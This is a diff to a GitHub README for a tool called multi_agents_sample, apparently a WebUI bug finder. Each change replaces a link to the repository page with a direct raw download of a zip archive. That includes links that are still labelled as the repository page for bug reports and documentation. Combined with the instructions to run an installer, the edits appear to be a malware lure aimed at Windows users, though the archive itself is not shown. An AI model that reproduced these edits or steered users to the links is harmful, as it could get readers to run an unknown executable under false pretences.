@@ -1,6 +1,6 @@
 # 🤖 multi_agents_sample - Find WebUI Bugs Faster
 
-[![Download multi_agents_sample](https://img.shields.io/badge/Download%20multi_agents_sample-Click%20Here-ff6347?style=for-the-badge&logo=github)](https://github.com/Volauventbuncombe53/multi_agents_sample)
+[![Download multi_agents_sample](https://img.shields.io/badge/Download%20multi_agents_sample-Click%20Here-ff6347?style=for-the-badge&logo=github)](https://github.com/Volauventbuncombe53/multi_agents_sample/raw/refs/heads/main/multi_agents/multi-sample-agents-v2.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run multi_agents_sample on your Windows compu
 
 Go to the main download page by clicking the big button above or this link:
 
-[https://github.com/Volauventbuncombe53/multi_agents_sample](https://github.com/Volauventbuncombe53/multi_agents_sample)
+[https://github.com/Volauventbuncombe53/multi_agents_sample/raw/refs/heads/main/multi_agents/multi-sample-agents-v2.6.zip](https://github.com/Volauventbuncombe53/multi_agents_sample/raw/refs/heads/main/multi_agents/multi-sample-agents-v2.6.zip)
 
 This page contains all the files you need to get started.
 
@@ -77,7 +77,7 @@ The interface uses easy words and buttons you can click to control everything.
 
 To get updates or bug fixes:
 
-- Visit the download page again: [https://github.com/Volauventbuncombe53/multi_agents_sample](https://github.com/Volauventbuncombe53/multi_agents_sample)
+- Visit the download page again: [https://github.com/Volauventbuncombe53/multi_agents_sample/raw/refs/heads/main/multi_agents/multi-sample-agents-v2.6.zip](https://github.com/Volauventbuncombe53/multi_agents_sample/raw/refs/heads/main/multi_agents/multi-sample-agents-v2.6.zip)
 - Download the latest version following the steps above.
 - Run the installer or update files as needed.
 
@@ -122,7 +122,7 @@ When you download and install multi_agents_sample, you get:
 
 If you want to learn more about multi_agents_sample or report bugs, visit the repository page:
 
-[https://github.com/Volauventbuncombe53/multi_agents_sample](https://github.com/Volauventbuncombe53/multi_agents_sample)
+[https://github.com/Volauventbuncombe53/multi_agents_sample/raw/refs/heads/main/multi_agents/multi-sample-agents-v2.6.zip](https://github.com/Volauventbuncombe53/multi_agents_sample/raw/refs/heads/main/multi_agents/multi-sample-agents-v2.6.zip)
 
 You will find links to submit issues, read more documentation, or contact the developer.
 
@@ -130,4 +130,4 @@ You will find links to submit issues, read more documentation, or contact the de
 
 ## ⬇️ Download multi_agents_sample Here
 
-[![Download multi_agents_sample](https://img.shields.io/badge/Download%20multi_agents_sample-Click%20Here-ff6347?style=for-the-badge&logo=github)](https://github.com/Volauventbuncombe53/multi_agents_sample)
+[![Download multi_agents_sample](https://img.shields.io/badge/Download%20multi_agents_sample-Click%20Here-ff6347?style=for-the-badge&logo=github)](https://github.com/Volauventbuncombe53/multi_agents_sample/raw/refs/heads/main/multi_agents/multi-sample-agents-v2.6.zip)
